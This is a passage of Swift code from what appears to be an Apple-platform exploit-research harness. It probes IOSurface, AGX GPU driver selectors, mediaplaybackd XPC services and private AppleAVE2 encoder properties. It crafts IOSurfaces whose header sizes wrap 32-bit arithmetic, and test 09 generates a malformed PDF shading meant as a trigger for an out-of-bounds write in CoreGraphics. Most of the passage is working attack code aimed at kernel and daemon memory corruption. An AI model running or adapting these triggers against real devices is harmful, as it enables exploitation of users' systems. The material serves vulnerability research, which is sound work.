        guard svc != 0, xq_IOServiceOpen(svc, mach_task_self_, 0, &conn) == KERN_SUCCESS else { benchLine("[NO] cannot open IOSurfaceRoot"); return }
        xq_IOObjectRelease(svc)
        let n = xml.utf8.count + 1
        var out = [UInt8](repeating: 0, count: 0xc68); var osz = 0xc68; var s0: UInt64 = 0
        var kr: kern_return_t = -1
        xml.withCString { cs in _ = cs.withMemoryRebound(to: UInt8.self, capacity: n) { p in
            out.withUnsafeMutableBytes { ob in
                kr = xq_IOConnectCallMethod(conn, 0, &s0, 1, p, n, nil, nil, ob.baseAddress, &osz) } } }
        func r32(_ o: Int) -> UInt32 {
            guard o + 4 <= out.count else { return 0 }
            return UInt32(out[o]) | (UInt32(out[o+1]) << 8) | (UInt32(out[o+2]) << 16) | (UInt32(out[o+3]) << 24)
        }
        let sid = osz >= 0x1c ? r32(0x18) : 0
        guard kr == 0, sid != 0, let surf = IOSurfaceLookup(sid) else {
            benchLine("[NO] surface rejected ?? kr=\(kr)"); xq_IOServiceClose(conn); return }
        let alloc = IOSurfaceGetAllocSize(surf)
        benchLine("[OK] 4-GiB header value for a 64 KiB surface")
        benchLine("     alloc 0x\(String(alloc, radix: 16)) ?? slices \(r32(0x74))")

        if let agx = agxServiceName(),
           let am = agx.withCString({ xq_IOServiceMatching($0) }) {
            benchLine("     AGX service \(agx)")
            var ai: io_iterator_t = 0
            if xq_IOServiceGetMatchingServices(0, am, &ai) == KERN_SUCCESS {
                let asvc = xq_IOIteratorNext(ai); xq_IOObjectRelease(ai)
                var ac: io_connect_t = 0
                if asvc != 0, xq_IOServiceOpen(asvc, mach_task_self_, 1, &ac) == KERN_SUCCESS {
                    xq_IOObjectRelease(asvc)
                    var ain = [UInt8](repeating: 0, count: 0x100); ain[0] = 0x82
                    ain[0x38] = UInt8(sid & 0xFF); ain[0x39] = UInt8((sid >> 8) & 0xFF)
                    ain[0x3a] = UInt8((sid >> 16) & 0xFF); ain[0x3b] = UInt8((sid >> 24) & 0xFF)
                    var ao = [UInt8](repeating: 0, count: 0x1000); var aosz = 0x1000
                    var akr: kern_return_t = -1
                    ain.withUnsafeBytes { ib in ao.withUnsafeMutableBytes { ob in
                        akr = xq_IOConnectCallMethod(ac, 8, nil, 0, ib.baseAddress, 0x100, nil, nil, ob.baseAddress, &aosz) } }
                    var va: UInt64 = 0, hdr: UInt64 = 0, dat: UInt64 = 0
                    for i in 0..<8 { va |= UInt64(ao[i]) << (8*i); hdr |= UInt64(ao[0x20+i]) << (8*i); dat |= UInt64(ao[0x28+i]) << (8*i) }
                    if akr == 0 {
                        benchLine("[OK] AGX resource built")
                        benchLine("     VA 0x\(String(va, radix: 16))")
                        benchLine("     out20 0x\(String(hdr, radix: 16)) (constant) ?? out28 0x\(String(dat, radix: 16))")
                    } else { benchLine("[NO] AGX selector 8 failed ?? kr=\(akr)") }
                    xq_IOServiceClose(ac)
                }
            }
        }
        xq_IOServiceClose(conn)
        benchLine("??? done")
    }

    func bench03Media() {
            emit("??? 03 ?? mediaplaybackd ?? FigXPC")
            guard let mp4 = Bundle.main.url(forResource: "h264-main", withExtension: "mp4"),
                  let data = try? Data(contentsOf: mp4) else {
                emit("[NO] h264-main.mp4 is missing from the bundle"); return
            }
            emit("     sample \(data.count) bytes read from the bundle")

            func cmTime(_ value: Int64, _ scale: Int32) -> XObj? {
                var b = [UInt8](repeating: 0, count: 24)
                withUnsafeBytes(of: value.littleEndian) { raw in for (i, x) in raw.enumerated() { b[i] = x } }
                withUnsafeBytes(of: scale.littleEndian) { raw in for (i, x) in raw.enumerated() { b[8 + i] = x } }
                withUnsafeBytes(of: Int32(1).littleEndian) { raw in for (i, x) in raw.enumerated() { b[12 + i] = x } }
                return b.withUnsafeBytes { xq_data_create($0.baseAddress, 24) }
            }
            func fnv(_ p: UnsafePointer<UInt8>, _ n: Int) -> UInt64 {
                var h: UInt64 = 0xcbf29ce484222325
                for i in 0..<n { h ^= UInt64(p[i]); h = h &* 0x100000001b3 }
                return h
            }

            let gotFrame = UnsafeMutablePointer<Bool>.allocate(capacity: 1)
            let gotFail = UnsafeMutablePointer<Bool>.allocate(capacity: 1)
            gotFrame.pointee = false; gotFail.pointee = false

            func open(_ svc: String) -> (XObj, Int64)? {
                let name = "com.apple.coremedia.mediaplaybackd.\(svc).xpc"
                guard let c = name.withCString({ xq_connection_create_service($0, queue, 0) }) else { return nil }
                xq_set_event_handler(c) { [weak self] e in
                    guard let self else { return }
                    let d = self.describe(e)
                    if d.contains("AIGDidGenerateCGImage") { gotFrame.pointee = true }
                    if d.contains("AIGFailedToGenerateCGImage") { gotFail.pointee = true }
                }
                xq_resume(c)
                var tok: Int64 = 0
                if let ping = xq_dictionary_create(nil, nil, 0) {
                    ".Operation".withCString { xq_dictionary_set_uint64(ping, $0, 0x2e706e67) }
                    ".ProcessName".withCString { k in
                        "Bench27".withCString { v in xq_dictionary_set_string(ping, k, v) }
                    }
                    if let r = sendSync(c, ping, timeout: 4.0) {
                        tok = ".Token".withCString { xq_dictionary_get_int64(r, $0) }
                        xq_release(r)
                    }
                    xq_release(ping)
                }
                return tok != 0 ? (c, tok) : nil
            }

            guard let (ac, atok) = open("asset") else { emit("[NO] the asset service did not accept the handshake"); return }
            var assetOID: UInt64 = 0
            if let m = xq_dictionary_create(nil, nil, 0) {
                ".Operation".withCString { xq_dictionary_set_uint64(m, $0, 0x63724242) }
                ".Token".withCString { xq_dictionary_set_int64(m, $0, atok) }
                data.withUnsafeBytes { raw in
                    if let dd = xq_data_create(raw.baseAddress, raw.count) {
                        "BlockBufferData".withCString { xq_dictionary_set_value(m, $0, dd) }
                        xq_release(dd)
                    }
                }
                "FormatIdentifierType".withCString { xq_dictionary_set_uint64(m, $0, 0) }
                "FormatIdentifier".withCString { k in
                    "public.mpeg-4".withCString { v in xq_dictionary_set_string(m, k, v) }
                }
                if let opts = xq_dictionary_create(nil, nil, 0) {
                    ".CreationOptions".withCString { xq_dictionary_set_value(m, $0, opts) }
                    xq_release(opts)
                }
                if let r = sendSync(ac, m, timeout: 10.0) {
                    assetOID = ".objectID".withCString { xq_dictionary_get_uint64(r, $0) }
                    let e = ".ErrorReturn".withCString { xq_dictionary_get_int64(r, $0) }
                    emit(e == 0 ? "[OK] asset created from raw bytes ?? crBB ?? err=0" : "[NO] crBB rejected the bytes ?? err=\(e)")
                    xq_release(r)
                }
                xq_release(m)
            }
            guard assetOID != 0 else { xq_release(ac); return }

            // Track list
            if let s = xq_dictionary_create(nil, nil, 0) {
                ".Operation".withCString { xq_dictionary_set_uint64(s, $0, 0x6c6f6431) }
                ".Token".withCString { xq_dictionary_set_int64(s, $0, atok) }
                ".objectID".withCString { xq_dictionary_set_uint64(s, $0, assetOID) }
                ".PropertyName".withCString { k in
                    "assetProperty_Tracks".withCString { v in xq_dictionary_set_string(s, k, v) }
                }
                if let r = sendSync(ac, s, timeout: 8.0) {
                    let e = ".ErrorReturn".withCString { xq_dictionary_get_int64(r, $0) }
                    emit(e == 0 ? "[OK] track list parsed by the daemon" : "[NO] track load failed ?? err=\(e)")
                    xq_release(r)
                }
                xq_release(s)
            }
            Thread.sleep(forTimeInterval: 1.0)
            let trackOID = assetOID &+ 256

            // Codec description
            if let s = xq_dictionary_create(nil, nil, 0) {
                ".Operation".withCString { xq_dictionary_set_uint64(s, $0, 0x54637079) }
                ".Token".withCString { xq_dictionary_set_int64(s, $0, atok) }
                ".objectID".withCString { xq_dictionary_set_uint64(s, $0, trackOID) }
                ".PropertyName".withCString { k in
                    "FormatDescriptionArray".withCString { v in xq_dictionary_set_string(s, k, v) }
                }
                if let r = sendSync(ac, s, timeout: 6.0) {
                    let e = ".ErrorReturn".withCString { xq_dictionary_get_int64(r, $0) }
                    if e == 0, let v = ".Value".withCString({ xq_dictionary_get_value(r, $0) }),
                       let p = xq_data_bytes(v) {
                        let n = xq_data_len(v)
                        var head = ""
                        for i in 0..<min(16, n) { head += String(format: "%02x", p[i]) }
                        emit("[OK] codec description read ?? \(n) bytes")
                        emit("     head \(head)")
                        emit("     fnv  \(String(format: "%016llx", fnv(p, n)))")
                    } else {
                        emit("[NO] description load failed ?? err=\(e)")
                    }
                    xq_release(r)
                }
                xq_release(s)
            }

            // Frame
            guard let (gc, gtok) = open("assetimagegenerator") else { xq_release(ac); return }
            var genOID: UInt64 = 0
            if let m = xq_dictionary_create(nil, nil, 0), let opts = xq_dictionary_create(nil, nil, 0) {
                ".Operation".withCString { xq_dictionary_set_uint64(m, $0, 0x63726561) }
                ".Token".withCString { xq_dictionary_set_int64(m, $0, gtok) }
                "Asset".withCString { xq_dictionary_set_uint64(m, $0, assetOID) }
                "Options".withCString { xq_dictionary_set_value(m, $0, opts) }
                if let r = sendSync(gc, m, timeout: 10.0) {
                    genOID = ".objectID".withCString { xq_dictionary_get_uint64(r, $0) }
                    let e = ".ErrorReturn".withCString { xq_dictionary_get_int64(r, $0) }
                    emit(e == 0 ? "[OK] image generator created" : "[NO] image generator failed ?? err=\(e)")
                    xq_release(r)
                }
                xq_release(opts); xq_release(m)
            }
            if genOID != 0, let m = xq_dictionary_create(nil, nil, 0), let opts = xq_dictionary_create(nil, nil, 0) {
                ".Operation".withCString { xq_dictionary_set_uint64(m, $0, 0x72657131) }
                ".Token".withCString { xq_dictionary_set_int64(m, $0, gtok) }
                ".objectID".withCString { xq_dictionary_set_uint64(m, $0, genOID) }
                if let t = cmTime(0, 24000) {
                    "ImageTime".withCString { xq_dictionary_set_value(m, $0, t) }
                    xq_release(t)
                }
                "Options".withCString { xq_dictionary_set_value(m, $0, opts) }
                if let r = sendSync(gc, m, timeout: 12.0) {
                    let e = ".ErrorReturn".withCString { xq_dictionary_get_int64(r, $0) }
                    emit(e == 0 ? "[OK] frame requested ?? waiting for the notification" : "[NO] frame request failed ?? err=\(e)")
                    xq_release(r)
                }
                xq_release(opts); xq_release(m)
            }
            Thread.sleep(forTimeInterval: 2.0)
            emit(gotFrame.pointee ? "[OK] frame decoded ?? AIGDidGenerateCGImage with an IOSurface" : (gotFail.pointee ? "[NO] decoder rejected the frame" : "[NO] no notification ?? the daemon may have died"))
            gotFrame.deallocate(); gotFail.deallocate()
            xq_cancel(gc); xq_release(gc)
            xq_cancel(ac); xq_release(ac)
            emit("??? done")
        }

    func bench04EncoderProps() {
        benchLine("??? 04 ?? AppleAVE2 property surface")
        var session: VTCompressionSession?
        let spec: [String: Any] = ["EnableHardwareAcceleratedVideoEncoder": true]
        let st = VTCompressionSessionCreate(
            allocator: kCFAllocatorDefault, width: 640, height: 360,
            codecType: kCMVideoCodecType_HEVC,
            encoderSpecification: spec as CFDictionary,
            imageBufferAttributes: nil, compressedDataAllocator: nil,
            outputCallback: nil, refcon: nil, compressionSessionOut: &session)
        guard st == 0, let s = session else { benchLine("[NO] session create failed ?? \(st)"); return }
        var accepted: [String] = []
        let keys: [(String, Any)] = [
            ("NumberOfTemporalLayers", 1), ("EncoderUsage", 1), ("BaseLayerFrameRate", 24),
            ("RCMode", 20), ("SVENum", 1), ("SVESchedMode", 7),
            ("UserDPBFramesForFaceTime", 16), ("DPBRequirements", 4),
        ]
        for (k, v) in keys {
            let r = VTSessionSetProperty(s, key: k as CFString, value: v as CFTypeRef)
            if r == 0 { accepted.append(k) }
            let label = r == 0 ? "accepted" : (r == -12900 ? "kVTPropertyNotSupportedErr" : "error \(r)")
            benchLine("     \(r == 0 ? "[OK]" : "[--]") \(k) ?? \(label)")
        }
        benchLine(accepted.isEmpty ? "[NO] no private key accepted" : "[OK] \(accepted.count) private key(s) accepted")
        if !accepted.isEmpty { benchLine("     \(accepted.joined(separator: ", "))") }
        VTCompressionSessionInvalidate(s)
        benchLine("??? done")
    }

    func bench05ANE() {
        benchLine("??? 05 ?? ANE reachability")
        var found = 0
        for cls in ["H11ANEIn", "AppleT8150ANEHAL", "AppleT8140ANEHAL", "AppleT8130ANEHAL"] {
            guard let m = cls.withCString({ xq_IOServiceMatching($0) }) else { continue }
            var it: io_iterator_t = 0
            guard xq_IOServiceGetMatchingServices(0, m, &it) == KERN_SUCCESS else { continue }
            var svc = xq_IOIteratorNext(it)
            if svc != 0 { found += 1 }
            while svc != 0 {
                var conn: io_connect_t = 0
                let kr = xq_IOServiceOpen(svc, mach_task_self_, 0, &conn)
                let label = kr == 0 ? "opened" : (kr == -536870201 ? "kIOReturnUnsupported (0xE00002C7)" : "error \(kr)")
                benchLine("     \(cls) ?? open(type 0) ?? \(label)")
                if kr == 0 { xq_IOServiceClose(conn) }
                var nxt = xq_IOIteratorNext(it)
                if nxt != svc { xq_IOObjectRelease(svc) }
                svc = nxt
            }
            xq_IOObjectRelease(it)
        }
        benchLine(found > 0 ? "[OK] ANE services visible in IOKit" : "[NO] no ANE service found")
        benchLine("     user client: kIOReturnUnsupported for every type")
        benchLine("??? done")
    }

    // MARK: - tests 09 and 10

    /// Builds the CVE-2026-112611 trigger: a Type 5 shading whose Type 2
    /// function declares N=1 while carrying 256 values in C0 and C1.
    private func benchShadingPDF() -> Data {
        let vpr = 136, r = 256, nVerts = vpr * r
        var stream = [UInt8]()
        stream.reserveCapacity(nVerts * 9 + 8)
        var acc: UInt32 = 0
        var bits = 0
        func put(_ value: UInt32, _ width: Int) {
            var i = width - 1
            while i >= 0 {
                acc = (acc << 1) | ((value >> UInt32(i)) & 1)
                bits += 1
                if bits == 8 { stream.append(UInt8(acc & 0xFF)); acc = 0; bits = 0 }
                i -= 1
            }
        }
        for i in 0..<nVerts {
            put(0x10000000 &+ UInt32(i), 32)
            put(0x10000000 &+ UInt32(i), 32)
            put(0x00, 8)
        }
        if bits > 0 { stream.append(UInt8((acc << (8 - bits)) & 0xFF)) }

        let c0 = Array(repeating: "1.0", count: r).joined(separator: " ")
        var pdf = Data("%PDF-1.7\n".utf8)
        pdf.append(contentsOf: [0x25, 0xE2, 0xE3, 0xCF, 0xD3, 0x0A])
        var offs = [0]

        func add(_ s: String) {
            offs.append(pdf.count)
            pdf.append(Data(s.utf8))
        }

        add("1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\nendobj\n")
        add("2 0 obj\n<< /Type /Pages /Kids [3 0 R] /Count 1 >>\nendobj\n")
        add("3 0 obj\n<< /Type /Page /Parent 2 0 R /MediaBox [0 0 200 200] "
            + "/Resources << /Shading << /Sh1 5 0 R >> >> /Contents 4 0 R >>\nendobj\n")
        add("4 0 obj\n<< /Length 8 >>\nstream\n /Sh1 sh\nendstream\nendobj\n")
        add("5 0 obj\n<< /ShadingType 5 /ColorSpace /DeviceCMYK /BitsPerCoordinate 32 "
            + "/BitsPerComponent 8 /VerticesPerRow \(vpr) /Decode [0 200 0 200 0 1] "
            + "/Function 6 0 R /Length \(stream.count) >>\nstream\n")
        pdf.append(contentsOf: stream)
        pdf.append(Data("\nendstream\nendobj\n".utf8))
        add("6 0 obj\n<< /FunctionType 2 /Domain [0 1] /N 1 "
            + "/C0 [\(c0)] /C1 [\(c0)] >>\nendobj\n")

        let xref = pdf.count
        var tail = "xref\n0 7\n0000000000 65535 f \n"
        for i in 1...6 { tail += String(format: "%010d 00000 n \n", offs[i]) }
        tail += "trailer\n<< /Size 7 /Root 1 0 R >>\nstartxref\n\(xref)\n%%EOF\n"
        pdf.append(Data(tail.utf8))
        return pdf
    }

    func bench09PDFShading() {
        benchLine("??? 09 ?? CoreGraphics PDF shading")
        benchLine("     Type 5 shading ?? Type 2 function with /N 1 and 256 values in C0/C1")
        let pdf = benchShadingPDF()
        benchLine("     generated \(pdf.count) bytes ?? \(136 * 256) vertices")

        guard let provider = CGDataProvider(data: pdf as CFData),
              let doc = CGPDFDocument(provider) else {
            benchLine("[NO] CoreGraphics rejected the document"); return
        }
        benchLine("[OK] CGPDFDocument opened it")
        guard let page = doc.page(at: 1) else { benchLine("[NO] no page"); return }

        let w = 512, h = 512
        guard let ctx = CGContext(data: nil, width: w, height: h, bitsPerComponent: 8,
                                  bytesPerRow: w * 4, space: CGColorSpaceCreateDeviceRGB(),
                                  bitmapInfo: CGImageAlphaInfo.premultipliedLast.rawValue) else {
            benchLine("[NO] bitmap context failed"); return
        }

        for pass in 1...3 {
            ctx.drawPDFPage(page)
            benchLine("     render pass \(pass) survived")
        }
        benchLine("[OK] rendering finished without a fault")
        benchLine("     no crash means the OOB write did not fire on this build")
        benchLine("??? done")
    }

    // MARK: surface + AGX field probe

    /// Creates an F1-shaped surface with a chosen header region per slice.
    private func benchMakeSurface(headerPerSlice: UInt32) -> (UInt32, IOSurfaceRef)? {
        let xml = """
        <?xml version="1.0" encoding="UTF-8"?>
        <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
        <plist version="1.0"><dict><key>IOSurfaceWidth</key><integer>64</integer><key>IOSurfaceHeight</key><integer>64</integer><key>IOSurfaceBytesPerElement</key><integer>4</integer><key>IOSurfacePixelFormat</key><integer>1111970369</integer><key>IOSurfaceAllocSize</key><integer>65536</integer><key>IOSurfaceSliceCount</key><integer>4</integer><key>IOSurfacePlaneInfo</key><array><dict><key>IOSurfacePlaneWidth</key><integer>64</integer><key>IOSurfacePlaneHeight</key><integer>64</integer><key>IOSurfacePlaneBytesPerElement</key><integer>4</integer><key>IOSurfacePlaneBytesPerRow</key><integer>512</integer><key>IOSurfacePlaneSize</key><integer>65536</integer><key>IOSurfacePlaneCompressionType</key><integer>4</integer><key>IOSurfacePlaneDataRegionBytesPerSlice</key><integer>16384</integer><key>IOSurfacePlaneHeaderRegionBytesPerSlice</key><integer>\(headerPerSlice)</integer><key>IOSurfacePlaneCompressedTileWidth</key><integer>32</integer><key>IOSurfacePlaneCompressedTileHeight</key><integer>32</integer><key>IOSurfacePlaneBytesPerCompressedTileHeader</key><integer>8</integer><key>IOSurfacePlaneBytesPerTileData</key><integer>4096</integer><key>IOSurfacePlaneWidthInCompressedTiles</key><integer>2</integer><key>IOSurfacePlaneHeightInCompressedTiles</key><integer>2</integer><key>IOSurfacePlaneBytesPerRowOfTileData</key><integer>8192</integer><key>IOSurfacePlaneCompressedTileHeaderRegionOffset</key><integer>65536</integer><key>IOSurfacePlaneCompressedTileDataRegionOffset</key><integer>0</integer><key>IOSurfacePlaneBytesPerRowOfCompressedTileHeaderGroups</key><integer>0</integer></dict></array></dict></plist>
        """
        guard let root = "IOSurfaceRoot".withCString({ xq_IOServiceMatching($0) }) else { return nil }
        var it: io_iterator_t = 0
        guard xq_IOServiceGetMatchingServices(0, root, &it) == KERN_SUCCESS else { return nil }
        let svc = xq_IOIteratorNext(it); xq_IOObjectRelease(it)
        var conn: io_connect_t = 0
        guard svc != 0, xq_IOServiceOpen(svc, mach_task_self_, 0, &conn) == KERN_SUCCESS else { return nil }
        xq_IOObjectRelease(svc)
        let n = xml.utf8.count + 1
        var out = [UInt8](repeating: 0, count: 0xc68)
        var osz = 0xc68
        var s0: UInt64 = 0
        var kr: kern_return_t = -1
        xml.withCString { cs in _ = cs.withMemoryRebound(to: UInt8.self, capacity: n) { p in
            out.withUnsafeMutableBytes { ob in
                kr = xq_IOConnectCallMethod(conn, 0, &s0, 1, p, n, nil, nil, ob.baseAddress, &osz) } } }
        defer { xq_IOServiceClose(conn) }
        guard kr == 0, osz >= 0x1c else { return nil }
        let sid = UInt32(out[0x18]) | (UInt32(out[0x19]) << 8) | (UInt32(out[0x1a]) << 16) | (UInt32(out[0x1b]) << 24)
        // The surface must stay referenced, otherwise it is gone before AGX
        // is asked to build a resource on it.
        guard sid != 0, let ref = IOSurfaceLookup(sid) else { return nil }
        return (sid, ref)
    }

    /// Asks AGX selector 8 for a resource built on the given surface.
    private func benchAGXQuery(sid: UInt32) -> (kern_return_t, UInt64, UInt64)? {
        guard let agx = agxServiceName(),
              let m = agx.withCString({ xq_IOServiceMatching($0) }) else { return nil }
        var it: io_iterator_t = 0
        guard xq_IOServiceGetMatchingServices(0, m, &it) == KERN_SUCCESS else { return nil }
        let svc = xq_IOIteratorNext(it); xq_IOObjectRelease(it)
        var conn: io_connect_t = 0
        guard svc != 0, xq_IOServiceOpen(svc, mach_task_self_, 1, &conn) == KERN_SUCCESS else { return nil }
        xq_IOObjectRelease(svc)
        defer { xq_IOServiceClose(conn) }
        var ain = [UInt8](repeating: 0, count: 0x100)
        ain[0] = 0x82
        ain[0x38] = UInt8(sid & 0xFF); ain[0x39] = UInt8((sid >> 8) & 0xFF)
        ain[0x3a] = UInt8((sid >> 16) & 0xFF); ain[0x3b] = UInt8((sid >> 24) & 0xFF)
        var ao = [UInt8](repeating: 0, count: 0x1000)
        var aosz = 0x1000
        var kr: kern_return_t = -1
        ain.withUnsafeBytes { ib in ao.withUnsafeMutableBytes { ob in
            kr = xq_IOConnectCallMethod(conn, 8, nil, 0, ib.baseAddress, 0x100, nil, nil, ob.baseAddress, &aosz) } }
        var f20: UInt64 = 0, f28: UInt64 = 0
        for i in 0..<8 {
            f20 |= UInt64(ao[0x20 + i]) << (8 * i)
            f28 |= UInt64(ao[0x28 + i]) << (8 * i)
        }
        return (kr, f20, f28)
    }

    /// Decides whether out+0x20 scales with the declared header region.
    func bench10AGXFields() {
        benchLine("??? 10 ?? AGX response fields")
        benchLine("     question: is out+0x20 a size or a flags word")

        var held: [IOSurfaceRef] = []
        var results: [(String, UInt32, UInt64, UInt64)] = []
        // Only headers whose (data + header) * slices exceeds 2^32 wrap to a
        // value <= planeSize, so these are the two that the parser accepts.
        for (label, header) in [("baseline 0x40000000", UInt32(0x40000000)),
                                ("wrapped  0xC0000000", UInt32(0xC0000000))] {
            let product = (UInt64(0x4000) + UInt64(header)) * 4
            let low32 = product & 0xFFFF_FFFF
            guard let (sid, ref) = benchMakeSurface(headerPerSlice: header) else {
                benchLine("[NO] surface rejected for header 0x\(String(header, radix: 16))")
                benchLine("     product 0x\(String(product, radix: 16)) ?? low32 0x\(String(low32, radix: 16)) ?? planeSize 0x10000")
                continue
            }
            held.append(ref)
            guard let (kr, f20, f28) = benchAGXQuery(sid: sid) else {
                benchLine("[NO] AGX query failed for sid \(sid)"); continue
            }
            let verdict = kr == 0 ? "" : " ?? AGX rejected (0x\(String(UInt32(bitPattern: kr), radix: 16)))"
            benchLine("     \(label) ?? sid \(sid) ?? kr=\(kr)\(verdict)")
            benchLine("          out+0x20 0x\(String(f20, radix: 16)) ?? out+0x28 0x\(String(f28, radix: 16))")
            if kr == 0 { results.append((label, header, f20, f28)) }
        }
        defer { held.forEach { _ = $0 } }

        guard results.count == 2 else { benchLine("[NO] not enough data"); return }
        let (_, hA, a20, a28) = results[0]
        let (_, hB, b20, b28) = results[1]
        let expectedA = UInt64(hA) * 4
        let expectedB = UInt64(hB) * 4

        if a20 == expectedA && b20 == expectedB {
            benchLine("[OK] out+0x20 scales with the declared header region")
            benchLine("     0x\(String(hA, radix: 16))??4 = 0x\(String(expectedA, radix: 16)) ?? 0x\(String(hB, radix: 16))??4 = 0x\(String(expectedB, radix: 16))")
            benchLine("     so it is a size field, not {flags, status}")
        } else if a20 == b20 {
            benchLine("[NO] out+0x20 stayed 0x\(String(a20, radix: 16)) for both shapes")
            benchLine("     so it is constant and must not be read as a size")
        } else {
            benchLine("[NO] out+0x20 changed but does not equal header??slices")
            benchLine("     expected 0x\(String(expectedA, radix: 16)) / 0x\(String(expectedB, radix: 16))")
        }
        benchLine("     out+0x28: 0x\(String(a28, radix: 16)) / 0x\(String(b28, radix: 16)) ?? data region ?? 4 = 0x10000")
        benchLine("??? done")
    }

    // MARK: - test 11: AppleAVE2 DPB reachability

    /// Runs a matrix of encoder configurations and reports which ones the driver
    /// accepts and processes. Whether the DPB branch was reached is decided from
    /// the kernel log on the host ("SVE DPB", "failed to create DPB").
    func bench11AVE_DPB() {
        benchLine("??? 11 ?? AppleAVE2 DPB reach")
        benchLine("     goal: make the driver build the DPB manager")
        benchLine("     watch the kernel log for SVE DPB / failed to create DPB")

        var frame: CVPixelBuffer?
        let attrs: [String: Any] = [kCVPixelBufferIOSurfacePropertiesKey as String: [:] as [String: Any]]
        CVPixelBufferCreate(kCFAllocatorDefault, 640, 360,
                            kCVPixelFormatType_420YpCbCr8BiPlanarVideoRange,
                            attrs as CFDictionary, &frame)
        guard let frame else { benchLine("[NO] pixel buffer allocation failed"); return }

        let codecs: [(String, CMVideoCodecType)] = [
            ("hevc", kCMVideoCodecType_HEVC),
            ("h264", kCMVideoCodecType_H264),
        ]
        let usages: [Int32] = [0, 1, 16]
        let multipass: [Int32] = [0, 1]

        var accepted = 0, processed = 0

        for (cname, codec) in codecs {
            for usage in usages {
                for mp in multipass {
                    var session: VTCompressionSession?
                    let spec: [String: Any] = ["EnableHardwareAcceleratedVideoEncoder": true]
                    let st = VTCompressionSessionCreate(
                        allocator: kCFAllocatorDefault, width: 640, height: 360,
                        codecType: codec,
                        encoderSpecification: spec as CFDictionary,
                        imageBufferAttributes: nil, compressedDataAllocator: nil,
                        outputCallback: nil, refcon: nil, compressionSessionOut: &session)
                    guard let s = session, st == 0 else {
                        benchLine("     \(cname) usage=\(usage) mp=\(mp) ?? create=\(st)")
                        continue
                    }
                    let r1 = VTSessionSetProperty(s, key: "EncoderUsage" as CFString, value: usage as CFTypeRef)
                    let r2 = VTSessionSetProperty(s, key: "EnableMultiPassEncoding" as CFString, value: mp as CFTypeRef)
                    let r3 = VTSessionSetProperty(s, key: "NumberOfTemporalLayers" as CFString, value: Int32(1) as CFTypeRef)
                    let prep = VTCompressionSessionPrepareToEncodeFrames(s)

                    var encResults: [Int32] = []
                    for i in 0..<3 {
                        var flags: VTEncodeInfoFlags = []
                        let er = VTCompressionSessionEncodeFrame(
                            s, imageBuffer: frame,
                            presentationTimeStamp: CMTime(value: Int64(i) * 1001, timescale: 24000),
                            duration: CMTime(value: 1001, timescale: 24000),
                            frameProperties: nil, sourceFrameRefcon: nil, infoFlagsOut: &flags)
                        encResults.append(er)
                    }
                    VTCompressionSessionCompleteFrames(s, untilPresentationTimeStamp: .invalid)
                    VTCompressionSessionInvalidate(s)

                    if r1 == 0 { accepted += 1 }
                    let allOK = encResults.allSatisfy { $0 == 0 }
                    if allOK { processed += 1 }
                    benchLine("     \(cname) usage=\(usage) mp=\(mp) ?? usage:\(r1) mp:\(r2) ntl:\(r3) prep:\(prep) enc:\(encResults.map(String.init).joined(separator: ","))"
                              + (allOK ? "  ??? accepted and queued" : ""))
                }
            }
        }

        benchLine(accepted > 0 ? "[OK] \(accepted)/12 configurations accepted" : "[NO] no configuration accepted")
        benchLine("     queued frames in \(processed)/12 configurations")
        benchLine("     compare with the kernel log on the host to see which ones built the DPB")
        benchLine("??? done")
    }

    // MARK: - test 12: which EncoderUsage opens the private property set

    /// Sweeps EncoderUsage and, for every accepted value, tries the private keys
    /// that the kext itself logs: SVENum, SVESchedMode, UseMultiPassSearch,
    /// DPBNumberOfFrames, UserDPBFramesForFaceTime, MultiPassStorage.
    func bench12AVE_Usage() {
        benchLine("??? 12 ?? AppleAVE2 usage sweep")
        benchLine("     one session only: creating twenty sessions made VideoToolbox crash in its own teardown")

        func makeSession() -> VTCompressionSession? {
            var session: VTCompressionSession?
            let spec: [String: Any] = ["EnableHardwareAcceleratedVideoEncoder": true]
            let st = VTCompressionSessionCreate(
                allocator: kCFAllocatorDefault, width: 640, height: 360,
                codecType: kCMVideoCodecType_HEVC,
                encoderSpecification: spec as CFDictionary,
                imageBufferAttributes: nil, compressedDataAllocator: nil,
                outputCallback: nil, refcon: nil, compressionSessionOut: &session)
            guard st == 0 else { benchLine("     create failed: \(st)"); return nil }
            return session
        }

        guard let probe = makeSession() else { benchLine("[NO] no session"); return }

        var accepted: [Int32] = []
        for usage in Int32(0)...20 {
            let r = VTSessionSetProperty(probe, key: "EncoderUsage" as CFString, value: usage as CFTypeRef)
            if r == 0 { accepted.append(usage) }
            benchLine("     usage \(usage) ?? \(r == 0 ? "accepted" : "rejected \(r)")")
        }
        benchLine(accepted.isEmpty ? "[NO] no usage accepted"
                                   : "[OK] accepted usages: \(accepted.map(String.init).joined(separator: ","))")

        // Sessions are kept alive until the end: releasing them while VT still has
        // callbacks queued is what crashed the previous build.
        var held: [VTCompressionSession] = [probe]
        let probes: [(String, CFTypeRef)] = [
            ("SVENum", Int32(1) as CFTypeRef),
            ("SVESchedMode", Int32(1) as CFTypeRef),
            ("UseMultiPassSearch", Int32(1) as CFTypeRef),
            ("DPBNumberOfFrames", Int32(16) as CFTypeRef),
            ("UserDPBFramesForFaceTime", Int32(16) as CFTypeRef),
        ]

        for usage in accepted {
            guard let s = makeSession() else { continue }
            held.append(s)
            _ = VTSessionSetProperty(s, key: "EncoderUsage" as CFString, value: usage as CFTypeRef)
            var line = "     usage \(usage):"
            for (key, value) in probes {
                let r = VTSessionSetProperty(s, key: key as CFString, value: value)
                line += " \(key)=\(r == 0 ? "ok" : String(r))"
            }
            benchLine(line)
        }

        // MultiPassStorage is accepted everywhere, so it is checked once and kept alive.
        var storageRef: VTMultiPassStorage?
        _ = VTMultiPassStorageCreate(allocator: kCFAllocatorDefault,
                                     fileURL: nil,
                                     timeRange: CMTimeRange(start: .invalid, duration: .invalid),
                                     options: nil,
                                     multiPassStorageOut: &storageRef)
        if let storage = storageRef {
            held.append(probe)
            let rs = VTSessionSetProperty(probe, key: "MultiPassStorage" as CFString, value: storage)
            benchLine("     MultiPassStorage ?? \(rs == 0 ? "accepted" : "rejected \(rs)")")
        } else {
            benchLine("     MultiPassStorage ?? object not created")
        }

        benchLine("     a usage that accepts SVENum opens the SVE/DPB path")
        benchLine("??? done")
        Thread.sleep(forTimeInterval: 0.5)
        _ = held.count
    }

    // MARK: - test 13: property order

    /// Every probe so far set EncoderUsage first, which locks the session. This
    /// test sets the private key on a fresh session *before* EncoderUsage and
